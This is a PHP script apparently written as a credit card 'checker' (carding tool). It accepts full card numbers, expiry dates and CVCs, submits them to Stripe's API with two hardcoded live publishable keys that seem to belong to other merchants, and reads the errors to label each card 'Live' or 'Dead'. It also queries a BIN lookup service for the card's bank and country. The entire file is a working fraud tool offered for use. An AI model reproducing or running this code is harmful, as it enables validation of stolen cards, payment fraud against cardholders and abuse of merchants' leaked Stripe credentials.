<?php
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');

$card = isset($_GET['card']) ? trim($_GET['card']) : null;

if (!$card || substr_count($card, '|') !== 3) {
    echo json_encode(['basari' => false, 'mesaj' => 'Format: ?card=NUMBER|MM|YY|CVC'], JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
    exit;
}

list($n, $m, $y, $c) = explode('|', $card);
$m = str_pad($m, 2, '0', STR_PAD_LEFT);
$y = strlen($y) == 2 ? '20'.$y : $y;

// BIN Lookup
$bin = substr($n, 0, 6);
$bin_info = bin_bilgi($bin);

// Stripe Keys
$keys = [
    'pk_live_51LPa3lEv2gutweVtFEiXL9FNjFW49XMEfF8XwAI8HN1tqR1eFDv7onDBdAKmfahG7wB84fGqSIFXHj1JbM55LbRp00s9A5T2Nl',
    'pk_live_51BZF1LK4mNBfnwY2pQmkrNe3reb4EhglJabk49UA1wfZRcDH26U8ImWSdTdPFyltqY2MuIbOW4LUmz54ESbYb3a700xrqWrBTz',
];

$result = null;
foreach ($keys as $key) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query([
            'type' => 'card', 'card[number]' => $n, 'card[exp_month]' => $m,
            'card[exp_year]' => $y, 'card[cvc]' => $c, 'key' => $key,
        ]),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
    ]);
    $res = json_decode(curl_exec($ch), true);
    curl_close($ch);

    if (isset($res['id'])) {
        $result = ['success' => true, 'card_info' => $res['card']];
        break;
    } elseif (isset($res['error'])) {
        $msg = $res['error']['message'] ?? '';
        if (stripos($msg, 'cvc') !== false || stripos($msg, 'security') !== false) {
            $result = ['success' => true, 'ccn_live' => true, 'error' => $msg];
            break;
        } elseif (stripos($msg, 'declined') !== false) {
            $result = ['success' => false, 'error' => $msg, 'declined' => true];
            break;
        }
    }
}

if ($result && $result['success']) {
    echo json_encode([
        'basari' => true,
        'kart' => $card,
        'durum' => 'Live',
        'mesaj' => '✅ Onaylandı',
        'bin_info' => $bin_info,
        'Developer' => '@TuncaySkay'
    ], JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
} elseif ($result && isset($result['declined'])) {
    echo json_encode([
        'basari' => false,
        'kart' => $card,
        'durum' => 'Dead',
        'mesaj' => '❌ Reddedildi',
        'bin_info' => $bin_info,
        'Developer' => '@TuncaySkay'
    ], JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
} else {
    echo json_encode([
        'basari' => false,
        'kart' => $card,
        'durum' => 'Error',
        'mesaj' => '⚠️ Bilinmeyen hata',
        'bin_info' => $bin_info,
        'Developer' => '@TuncaySkay'
    ], JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
}

function bin_bilgi($bin) {
    $ctx = stream_context_create(['http' => ['timeout' => 5]]);
    $resp = @file_get_contents("https://bins.antipublic.cc/bins/$bin", false, $ctx);
    if ($resp) {
        $data = json_decode($resp, true);
        return [
            'Banka' => $data['bank'] ?? 'Bilinmiyor',
            'Ulke' => $data['country'] ?? 'Bilinmiyor',
            'Marka' => ($data['brand'] ?? '?'),
            'Tur' => ($data['type'] ?? '?'),
        ];
    }
    return ['Banka' => 'Bilinmiyor', 'Ulke' => 'Bilinmiyor', 'Marka' => '?', 'Tur' => '?'];
}
?>
